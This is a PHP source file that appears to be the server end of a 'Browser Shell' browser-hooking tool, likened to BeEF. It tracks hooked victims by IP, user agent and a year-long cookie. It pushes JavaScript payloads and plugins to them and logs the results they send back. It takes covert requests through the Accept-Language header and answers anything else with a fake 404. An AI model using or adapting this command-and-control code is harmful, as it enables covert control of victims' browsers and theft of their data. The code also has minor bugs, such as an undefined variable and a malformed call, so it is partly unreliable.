<?php

/**
 * Browser Shell PHP callback implementation. Slicker than BeeF?
 *
 * Relies only on PCRE PHP extension
 *
 * Feel free to implement a different language version, shouldn't take too long..
 *
 * (c) aybabtus 201206 - MIT License, PROVIDED "AS IS", NO WARRANTIES (but donations welcome)
 */


// Only disables setting NEW cookies, if it's are already set, client will send them.
define('DISABLE_COOKIES', false);

include("classes.php");

if(isset($_REQUEST["req"])) {
  $request = json_decode($_REQUEST["req"]);
} else if(isset($_SERVER["HTTP_ACCEPT_LANGUAGE"])) {
  $request = json_decode($_SERVER["HTTP_ACCEPT_LANGUAGE"]);
  if(!is_object($request)) {
    Header("404 Not Found");
    die();
  }
}

$sessId = isset($request->sessionId) ? preg_replace("/[^a-z0-9]/", "", $request->sessionId) : false;
if(!$sessId) {
  if(isset($_COOKIE["BsHell"])) {
    $sessId = preg_replace("/[^a-z0-9]/", "", $_COOKIE["BsHell"]);
  }
}
if(strlen($sessId) != 32)
  $sessId = false;
$session = Session::get($sessId);

$response = false;

if(isset($request->cmd)) {
  Log::loga("request from client " . $sessid . ": " . json_encode($request));
  $initialPayloads = false;
  switch($request->cmd) {
  case "payload":
    $payload = explode("/", $request->name);
    $name = $payload[0];
    if(isset($payload[1]))
      $name .= DIRECTORY_SEPARATOR . $payload[1];
    Payloads::assign("payloads", $name, $session->id);
    break;

  case "stop":
    Log:loga("client " . $session->id . " stopped");
    $session->stopped = true;
    break;

  case "start":
    $initialPayloads = true;
  case "resume":
    $session->ua = $_SERVER["HTTP_USER_AGENT"];
    $session->ip = $_SERVER["REMOTE_ADDR"];
    Log::loga("client " . $session->id . " " . $request->cmd . ": " . json_encode($session));
    Payloads::init($session->id, $initialPayloads);
    break;

  case "plugin":
    $plugin = basename($request->name);
    Payloads::assign("plugins", $plugin.DIRECTORY_SEPARATOR.$plugin.".js", $session->id);
    break;

  case "result":
    $resp = json_encode(isset($request->response) ? $request->response : false);
    Log::loga("response from client " . $session->id . " for " . $request->id . ": " . $resp);
    Payloads::response($session->id, $request->id, $resp);
    break;

  default:
    break;
  }
}

$code = Payloads::scan($session->id);
$response = $code != false ? $code : array();

Session::updateLastActivity($session);

if(Session::isNew($session))
  $response["sessionId"] = $session->id;

if(!DISABLE_COOKIES)
  if(!isset($_COOKIE["BsHell"]) || $_COOKIE["BsHell"] !== $session->id) {
    SetCookie("BsHell", $session->id, time()+60*60*24*365, "/");
  }

$json = json_encode($response);
if($json != "[]")
  Log::loga("Sending " . $json . " to " . $session->id);
Header("Pragma: no-cache");
Header("Expires: 0");
Header("Cache-Control: private");
print $json;
?>